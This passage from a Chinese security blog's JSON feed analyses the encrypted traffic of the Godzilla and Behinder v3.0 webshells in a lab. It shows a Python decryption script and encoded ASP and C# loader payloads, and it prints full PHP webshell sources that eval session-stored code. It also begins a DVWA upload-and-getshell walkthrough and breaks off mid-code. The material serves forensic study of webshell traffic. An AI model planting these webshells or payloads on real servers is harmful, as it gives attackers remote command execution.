decrypter.decrypt_req_payload(b&#x27;pass=0mQU%2BS1pFnTz3ttVTnAgJVD%2FaBwD3NNXL3TfTExo1weKu4KAhhCu6Gn1EQfX1m9g&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(</span><br><span class=\"line\">        b&#x27;11CD6A8758984163LF/IpkPvM0iJI4wmpBs2DaoBVvcbDMpwuL7nYS3n/k4=6C37AC826A2A04BC&#x27;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;11cd6ab2s=ac826a&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;methodName\\x02\\x04\\x00\\x00\\x00test&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;ok&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_EVAL_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=eval%28%22Ex%22%26cHr%28101%29%26%22cute%28%22%22Server.ScriptTimeout%3D3600%3AOn+Error+Resume+Next%3AFunction+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function%3AEx%22%26cHr%28101%29%26%22cute%28%22%22%22%22On+Error+Resume+Next%3A%22%22%22%22%26bd%28%22%22%22%220d0a5365742062797061737344696374696f6e617279203d205365727665722e4372656174654f626a6563742822536372697074696e672e44696374696f6e61727922290d0a0d0a46756e6374696f6e204261736536344465636f646528427956616c2076436f6465290d0a2020202044696d206f584d4c2c206f4e6f64650d0a20202020536574206f584d4c203d204372656174654f626a65637428224d73786d6c322e444f4d446f63756d656e742e332e3022290d0a20202020536574206f4e6f6465203d206f584d4c2e437265617465456c656d656e74282262617365363422290d0a202020206f4e6f64652e6461746154797065203d202262696e2e626173653634220d0a202020206f4e6f64652e74657874203d2076436f64650d0a202020204261736536344465636f6465203d206f4e6f64652e6e6f6465547970656456616c75650d0a20202020536574206f4e6f6465203d204e6f7468696e670d0a20202020536574206f584d4c203d204e6f7468696e670d0a456e642046756e6374696f6e0d0a0d0a46756e6374696f6e2064656372797074696f6e28636f6e74656e742c697342696e290d0a2020202064696d2073697a652c692c726573756c742c6b657953697a650d0a202020206b657953697a65203d206c656e286b6579290d0a202020205365742042696e61727953747265616d203d204372656174654f626a656374282241444f44422e53747265616d22290d0a2020202042696e61727953747265616d2e43686172536574203d202269736f2d383835392d31220d0a2020202042696e61727953747265616d2e54797065203d20320d0a2020202042696e61727953747265616d2e4f70656e0d0a202020206966204973417272617928636f6e74656e7429207468656e0d0a202020202020202073697a653d55426f756e6428636f6e74656e74292b310d0a2020202020202020466f7220693d3120546f2073697a650d0a20202020202020202020202042696e61727953747265616d2e57726974655465787420636872772861736362286d69646228636f6e74656e742c692c312929290d0a20202020202020204e6578740d0a20202020656e642069660d0a2020202042696e61727953747265616d2e506f736974696f6e203d20300d0a20202020696620697342696e207468656e0d0a202020202020202042696e61727953747265616d2e54797065203d20310d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e5265616428290d0a20202020656c73650d0a202020202020202064656372797074696f6e3d42696e61727953747265616d2e526561645465787428290d0a20202020656e642069660d0a0d0a456e642046756e6374696f6e0d0a20202020636f6e74656e743d726571756573742e466f726d28226b657922290d0a202020206966206e6f74204973456d70747928636f6e74656e7429207468656e0d0a0d0a2020202020202020696620204973456d7074792853657373696f6e28227061796c6f6164222929207468656e0d0a202020202020202020202020636f6e74656e743d64656372797074696f6e284261736536344465636f646528636f6e74656e74292c66616c7365290d0a20202020202020202020202053657373696f6e28227061796c6f616422293d636f6e74656e740d0a202020202020202020202020726573706f6e73652e456e640d0a2020202020202020656c73650d0a202020202020202020202020636f6e74656e743d4261736536344465636f646528636f6e74656e74290d0a20202020202020202020202062797061737344696374696f6e6172792e41646420227061796c6f6164222c53657373696f6e28227061796c6f616422290d0a202020202020202020202020457865637574652862797061737344696374696f6e61727928227061796c6f61642229290d0a202020202020202020202020726573756c743d72756e28636f6e74656e74290d0a202020202020202020202020726573706f6e73652e5772697465282238323831333022290d0a2020202020202020202020206966206e6f74204973456d70747928726573756c7429207468656e0d0a20202020202020202020202020202020726573706f6e73652e577269746520426173653634456e636f64652864656372797074696f6e28726573756c742c7472756529290d0a202020202020202020202020656e642069660d0a202020202020202020202020726573706f6e73652e5772697465282232306562626322290d0a2020202020202020656e642069660d0a20202020656e642069660d0a0d0a%22%22%22%22%29%29%3AResponse.End%22%22%29%22%29%0D%0A&amp;key=bWV0aG9kTmFtZQIEAAAAdGVzdA%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;828130b2s=20ebbc&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_XOR_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(b&quot;pass=DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(b&quot;11cd6aDF0=ac826a&quot;)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = ASP_XOR_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    asp_xor_raw_req = &#x27;0e5311580d5c2f580e54373632346147064511&#x27;</span><br><span class=\"line\">    asp_xor_raw_res = &#x27;0c5d&#x27;</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(asp_xor_raw_req)))</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(asp_xor_raw_res)))</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = CSHAP_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(b&#x27;pass=&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(b&#x27;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    # decrypter = CSHAP_EVAL_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(</span><br><span class=\"line\">    #     b&#x27;pass=eval%28System.Text.Encoding.Default.GetString%28System.Convert.FromBase64String%28HttpUtility.UrlDecode%28%27ICAgICAgICAgICAgICAgIHRyeSB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBhcHBjb250ZXh0ID0gSHR0cENvbnRleHQuQ3VycmVudDsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5BcHBsaWNhdGlvbi5SZW1vdmUoIiIpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIga2V5ID0gIjNjNmUwYjhhOWMxNTIyNGEiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgcGFzcyA9ICJrZXkiOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llTmFtZSA9ICJzZXNzaW9uS2V5IjsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIGNvb2tpZVZhbHVlID0gYXBwY29udGV4dC5SZXF1ZXN0LkNvb2tpZXMuR2V0KGNvb2tpZU5hbWUpID09IG51bGwgPyAiIiA6IGFwcGNvbnRleHQuUmVxdWVzdC5Db29raWVzLkdldChjb29raWVOYW1lKS5WYWx1ZTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG1kNSA9IFN5c3RlbS5CaXRDb252ZXJ0ZXIuVG9TdHJpbmcobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuTUQ1Q3J5cHRvU2VydmljZVByb3ZpZGVyKCkuQ29tcHV0ZUhhc2goU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhwYXNzICsga2V5KSkpLlJlcGxhY2UoIi0iLCAiIik7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBkYXRhID0gU3lzdGVtLkNvbnZlcnQuRnJvbUJhc2U2NFN0cmluZyhhcHBjb250ZXh0LlJlcXVlc3RbcGFzc10pOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgYXNzZW1ibHkgPSBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLkdldChjb29raWVWYWx1ZSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIChhc3NlbWJseSA9PSBudWxsKQ0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgY29va2llID0gbmV3IEh0dHBDb29raWUoY29va2llTmFtZSwgU3lzdGVtLkd1aWQuTmV3R3VpZCgpLlRvU3RyaW5nKCJOIikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgY29va2llVmFsdWUgPSBjb29raWUuVmFsdWU7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLkNvb2tpZXMuQWRkKGNvb2tpZSk7DQogICAgICAgICAgICAgICAgCQkJCQlhc3NlbWJseSA9IFN5c3RlbS5SZWZsZWN0aW9uLkFzc2VtYmx5LkxvYWQobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LkFwcGxpY2F0aW9uLlNldChjb29raWVWYWx1ZSwgYXNzZW1ibHkpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVsc2UNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdmFyIG8gPSBhc3NlbWJseS5DcmVhdGVJbnN0YW5jZSgiTFkiKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHZhciBvdXRTdHJlYW0gPSBuZXcgU3lzdGVtLklPLk1lbW9yeVN0cmVhbSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMob3V0U3RyZWFtKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIG8uRXF1YWxzKGFwcGNvbnRleHQpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgby5FcXVhbHMobmV3IFN5c3RlbS5TZWN1cml0eS5DcnlwdG9ncmFwaHkuUmlqbmRhZWxNYW5hZ2VkKCkuQ3JlYXRlRGVjcnlwdG9yKFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSwgU3lzdGVtLlRleHQuRW5jb2RpbmcuRGVmYXVsdC5HZXRCeXRlcyhrZXkpKS5UcmFuc2Zvcm1GaW5hbEJsb2NrKGRhdGEsIDAsIGRhdGEuTGVuZ3RoKSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvLlRvU3RyaW5nKCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB2YXIgciA9IG91dFN0cmVhbS5Ub0FycmF5KCk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBvdXRTdHJlYW0uRGlzcG9zZSgpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgYXBwY29udGV4dC5SZXNwb25zZS5Xcml0ZShtZDUuU3Vic3RyaW5nKDAsIDE2KSk7DQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBhcHBjb250ZXh0LlJlc3BvbnNlLldyaXRlKFN5c3RlbS5Db252ZXJ0LlRvQmFzZTY0U3RyaW5nKG5ldyBTeXN0ZW0uU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LlJpam5kYWVsTWFuYWdlZCgpLkNyZWF0ZUVuY3J5cHRvcihTeXN0ZW0uVGV4dC5FbmNvZGluZy5EZWZhdWx0LkdldEJ5dGVzKGtleSksIFN5c3RlbS5UZXh0LkVuY29kaW5nLkRlZmF1bHQuR2V0Qnl0ZXMoa2V5KSkuVHJhbnNmb3JtRmluYWxCbG9jayhyLCAwLCByLkxlbmd0aCkpKTsNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGFwcGNvbnRleHQuUmVzcG9uc2UuV3JpdGUobWQ1LlN1YnN0cmluZygxNikpOw0KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB9DQoNCiAgICAgICAgICAgICAgICB9IGNhdGNoIChlKSB7DQogICAgICAgICAgICAgICAgfQ0K%27%29%29%29%2C%27unsafe%27%29%3B&amp;key=WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(</span><br><span class=\"line\">    #     b&#x27;72A9C691CCDAAB98CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=B4C4E1F6DDD2A488&#x27;)</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\"></span><br><span class=\"line\">    decrypter = CSHAP_ASMX_AES_BASE64(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    asmx_req = b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class=\"line\">    &lt;soap:Envelope xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot; xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</span><br><span class=\"line\">      &lt;soap:Body&gt;</span><br><span class=\"line\">        &lt;pass xmlns=&quot;http://tempuri.org/&quot;&gt;</span><br><span class=\"line\">          &lt;pass&gt;WwSelqL9JENiXyh3FQxhh6neBpd6CFz4tFjBohtMq8pX0MY0w6%2F1Gkg4dxy5JO9o&lt;/pass&gt;</span><br><span class=\"line\">        &lt;/pass&gt;</span><br><span class=\"line\">      &lt;/soap:Body&gt;</span><br><span class=\"line\">    &lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;</span><br><span class=\"line\">    asmx_res = b&#x27;&#x27;&#x27;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;soap:Envelope xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot; xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot; xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;&gt;&lt;soap:Body&gt;&lt;passResponse xmlns=&quot;http://tempuri.org/&quot;&gt;&lt;passResult&gt;11CD6A8758984163CRF8Fju8YJWYsacdj2S9hlrsxeDHV8GSkLM/jS9ONlU=6C37AC826A2A04BC&lt;/passResult&gt;&lt;/passResponse&gt;&lt;/soap:Body&gt;&lt;/soap:Envelope&gt;&#x27;&#x27;&#x27;</span><br><span class=\"line\">    data = decrypter.decrypt_req_payload(asmx_req)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    data = decrypter.decrypt_res_payload(asmx_res)</span><br><span class=\"line\">    print(data)</span><br><span class=\"line\">    # decrypter = CSHAP_AES_RAW(pass_=&#x27;pass&#x27;, key=&#x27;3c6e0b8a9c15224a&#x27;)</span><br><span class=\"line\">    # cshap_aes_raw_req=&#x27;5b049e96a2fd2443625f2877150c6187a9de06977a085cf8b458c1a21b4cabca57d0c634c3aff51a4838771cb924ef68&#x27;</span><br><span class=\"line\">    # cshap_aes_raw_res = &#x27;09117c163bbc609598b1a71d8f64bd865aecc5e0c757c19290b33f8d2f4e3655&#x27;</span><br><span class=\"line\">    # data = decrypter.decrypt_req_payload(bytes(bytearray.fromhex(cshap_aes_raw_req)))</span><br><span class=\"line\">    # print(data)</span><br><span class=\"line\">    # data = decrypter.decrypt_res_payload(bytes(bytearray.fromhex(cshap_aes_raw_res)))</span><br><span class=\"line\">    # print(data)</span><br></pre></td></tr></table></figure>\n<p>找到如下模块并写入自己抓取流量包的数据（注意代码前方的缩进）<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YgxVz9UGNO1EI7iG.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/TKeBzCkFRK0nZYVX.png!thumbnail\" alt=\"\"></p>\n<p>运行能够看到解密出来的代码</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/E53uurH7zQWXkpa1.png!thumbnail\" alt=\"\"></p>\n<p>给它整理一下</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@session_start();</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">function encode($D,$K) &#123;</span><br><span class=\"line\">\tfor ($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class=\"line\">\t\t$c = $K[$i+1&amp;15];</span><br><span class=\"line\">\t\t$D[$i] = $D[$i]^$c;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\treturn $D;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$pass=&#x27;key&#x27;;</span><br><span class=\"line\">$payloadName=&#x27;payload&#x27;;</span><br><span class=\"line\">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class=\"line\">if (isset($_POST[$pass])) &#123;</span><br><span class=\"line\">\t$data=encode(base64_decode($_POST[$pass]),$key);</span><br><span class=\"line\">\tif (isset($_SESSION[$payloadName])) &#123;</span><br><span class=\"line\">\t\t$payload=encode($_SESSION[$payloadName],$key);</span><br><span class=\"line\">\t\tif (strpos($payload,&quot;getBasicsInfo&quot;)===false) &#123;</span><br><span class=\"line\">\t\t\t$payload=encode($payload,$key);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\tteval($payload);</span><br><span class=\"line\">\t\techo substr(md5($pass.$key),0,16);</span><br><span class=\"line\">\t\techo base64_encode(encode(@run($data),$key));</span><br><span class=\"line\">\t\techo substr(md5($pass.$key),16);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\tif (strpos($data,&quot;getBasicsInfo&quot;)!==false) &#123;</span><br><span class=\"line\">\t\t\t$_SESSION[$payloadName]=encode($data,$key);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以看到这便是 PHP 的加密脚本，把解密脚本中的 exit () 给注释掉，重新运行，能够看到终端返回的数据<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/cDj4Klwx7PvggCh2.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>在这里能够看到是我们输入了命令 ls 之后的回显，切换另一个流试试</p>\n<p>tcp 流 32：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wA5tuDksQN35qidX.png!thumbnail\" alt=\"\"></p>\n<p>将对应的数据填入脚本当中，运行</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/MS0bzMoV5f6yrg4E.png!thumbnail\" alt=\"\"></p>\n<p>能够看到回显出了根目录底下的文件，便是 ls / 命令的回显</p>\n<p>接下来将加密器切换成 PHP_XOR_BASE64 重新上传抓包</p>\n<p>先看看它生成的马</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">@session_start();</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">function encode($D,$K)&#123;</span><br><span class=\"line\">    for($i=0;$i&lt;strlen($D);$i++) &#123;</span><br><span class=\"line\">        $c = $K[$i+1&amp;15];</span><br><span class=\"line\">        $D[$i] = $D[$i]^$c;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    return $D;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">$pass=&#x27;pass&#x27;;</span><br><span class=\"line\">$payloadName=&#x27;payload&#x27;;</span><br><span class=\"line\">$key=&#x27;3c6e0b8a9c15224a&#x27;;</span><br><span class=\"line\">if (isset($_POST[$pass]))&#123;</span><br><span class=\"line\">    $data=encode(base64_decode($_POST[$pass]),$key);</span><br><span class=\"line\">    if (isset($_SESSION[$payloadName]))&#123;</span><br><span class=\"line\">        $payload=encode($_SESSION[$payloadName],$key);</span><br><span class=\"line\">        if (strpos($payload,&quot;getBasicsInfo&quot;)===false)&#123;</span><br><span class=\"line\">            $payload=encode($payload,$key);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        eval($payload);</span><br><span class=\"line\">        echo substr(md5($pass.$key),0,16);</span><br><span class=\"line\">        echo base64_encode(encode(@run($data),$key));</span><br><span class=\"line\">        echo substr(md5($pass.$key),16);</span><br><span class=\"line\">    &#125;else&#123;</span><br><span class=\"line\">        if (strpos($data,&quot;getBasicsInfo&quot;)!==false)&#123;</span><br><span class=\"line\">            $_SESSION[$payloadName]=encode($data,$key);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>再来看看流量包的追踪流<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/79qMzmBEXGPmxwbd.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>发现加密器不同，追踪流的数据也就自然不同，该加密器下请求体解密方法为先 base64 后解 xor，在解密脚本找到相对应的解密模块试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pO8s8NXrSMbCQSW1.png!thumbnail\" alt=\"\"></p>\n<p>也同样能够看到 ls / 命令之下的回显</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/8w1r9fuqq7S2pF0S.png!thumbnail\" alt=\"\"></p>\n<p>切换下一个请求体与响应体对应解密</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/wmj2C45JJcjWfYeC.png!thumbnail\" alt=\"\"></p>\n<p>能够看到 ls 命令的回显</p>\n<p>对比了 PHP_EVAL_XOR_BASE64 和 PHP_XOR_BASE64 之后能够发现，PHP_EVAL_XOR_BASE64 下的请求体与响应体基本是一个流对应一条命令，而 PHP_XOR_BASE64 可以是多条命令的请求体与响应体存在同一个流之中</p>\n",
            "tags": [
                "流量"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E5%86%B0%E8%9D%8Ev3.0%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "冰蝎v3.0流量浅析",
            "date_published": "2024-04-16T05:58:19.043Z",
            "content_html": "<p>近期稍微对冰蝎的流量进行了一些分析，因此来记录一下</p>\n<p>首先用的工具是冰蝎 3.0 版本的，它相对于 2.0 来说，做出了一些改动，个人认为比较大的一个特点就是取消了动态密钥的获取，也就是说如果只是在一个加密的命令执行的追踪流下，是无法获取到加密后的密钥的，这里在 NSSCTF 开了一个 DVWA 的环境来进行一个上传的 getshell 演示</p>\n<p>首先直接在上传口上传蚁剑 v3.0 的 shell.php，这里就用 php 来进行演示</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4DCN2h1wG1fpqHRz.png!thumbnail\" alt=\"\"></p>\n<p>可以看到的是上传成功和路径，接下来进行冰蝎的连接</p>\n<p>首先点击新增</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/pOhbzvHyt49soKp2.png!thumbnail\" alt=\"\"></p>\n<p>在弹出来的页面编辑好 url 和密码</p>\n<p>这里先来看一下 shell.php</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">@error_reporting(0);</span><br><span class=\"line\">session_start();</span><br><span class=\"line\">    $key=&quot;e45e329feb5d925b&quot;; //该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br><span class=\"line\">    $_SESSION[&#x27;k&#x27;]=$key;</span><br><span class=\"line\">    $post=file_get_contents(&quot;php://input&quot;);</span><br><span class=\"line\">    if(!extension_loaded(&#x27;openssl&#x27;))</span><br><span class=\"line\">    